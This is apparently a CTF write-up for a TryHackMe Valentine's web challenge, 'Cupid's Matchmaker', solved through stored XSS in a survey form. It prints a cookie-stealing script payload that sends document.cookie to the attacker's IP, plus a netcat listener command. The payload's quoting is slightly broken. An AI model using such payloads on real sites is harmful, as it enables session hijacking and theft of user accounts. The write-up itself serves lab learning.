---
title: "Cupids Matchmaker"
date: 2026-02-17
categories:
  - THM
tags:
  - "Web"
  - "2026"
  - "XSS"
platform: THM 2026
competition_year: 2026
toc: true
toc_sticky: true
---

# 🌐 Love at First Breach 2026 - Cupid's Matchmaker

|Category         |	Author                |
|-----------------|-----------------------|
|🌐 Web         |TryHackMe      |

## Challenge Prompt

My Dearest Hacker,

Tired of soulless AI algorithms? At Cupid's Matchmaker, real humans read your personality survey and personally match you with compatible singles. Our dedicated matchmaking team reviews every submission to ensure you find true love this Valentine's Day! 💘No algorithms. No AI. Just genuine human connection

You can access the web app here: `http://MACHINE_IP:5000`

## Problem Type
- XSS

## Solve
Upon visiting the page we see Cupid's Matchmaker. The page suggests we start with doing the survey:
<img width="1912" height="800" alt="2026-02-14_22-16-12" src="https://github.com/user-attachments/assets/fd29dd6a-3b4a-4bb1-ab9f-a6451579c202" />


If we visit the survey, we can put anything we want into the textarea boxes, so how about some XSS? :)<br>
I used:
```html
<script>fetch(http://MY_IP:7777/?c='+document.cookie)</script>
```
<img width="1241" height="801" alt="2026-02-15_13-25-30" src="https://github.com/user-attachments/assets/64497e16-543a-4f4e-837b-e719710413dc" />


Before submitting the form start a netcat listnener on your machine with `nc -nvlp 7777`<br>
<img width="271" height="57" alt="2026-02-15_13-26-07" src="https://github.com/user-attachments/assets/fba9e209-3d1e-4693-a324-9c41f95fd9db" />


Submit the form and you should get the flag:
<img width="989" height="222" alt="2026-02-15_13-26-13" src="https://github.com/user-attachments/assets/5797835f-39a7-4554-89d8-5077d7f71ed7" />

